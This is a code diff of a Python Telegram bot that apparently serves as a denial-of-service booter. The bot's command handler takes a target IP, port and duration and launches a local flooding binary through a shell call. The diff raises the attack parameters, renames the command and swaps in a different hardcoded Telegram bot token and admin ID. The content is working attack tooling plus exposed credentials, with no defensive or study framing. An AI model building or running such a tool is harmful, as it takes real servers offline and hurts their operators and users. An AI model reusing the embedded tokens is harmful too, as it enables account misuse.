@@ -9,8 +9,8 @@ import threading
 import time
 
 # Bot token and admin user ID (as strings)
-bot = telebot.TeleBot('7248587968:AAECpvzk5D59lgN8qBgtEWQpA4sCrrsvjJQ:')
-admin_id = {"6712658978"}
+bot = telebot.TeleBot('7248587968:AAEsQFgweeIhsRwMH4nD2uKINX_DGpzpGaQ')
+admin_id = {"6539807903"}
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -161,7 +161,7 @@ def start_attack_reply(message, target, port, duration):
 # Function to run the attack using subprocess
 def run_attack(target, port, duration):
     global attack_in_progress, attack_end_time
-    full_command = f"./mrin {target} {port} {duration} 300"
+    full_command = f"./mrin {target} {port} {duration} 512 750"
     subprocess.run(full_command, shell=True)
     # Once the attack finishes, mark the target IP as attacked and clear the global attack flag
     with attack_lock:
@@ -169,8 +169,8 @@ def run_attack(target, port, duration):
         attack_in_progress = False
         attack_end_time = None
 
-# /bgmi command handler: Only one attack runs at a time globally and each IP can only be attacked once.
-@bot.message_handler(commands=['bgmi'])
+# /gaurav command handler: Only one attack runs at a time globally and each IP can only be attacked once.
+@bot.message_handler(commands=['gaurav'])
 def handle_bgmi(message):
     global attack_in_progress, attack_end_time
     user_id = str(message.chat.id)
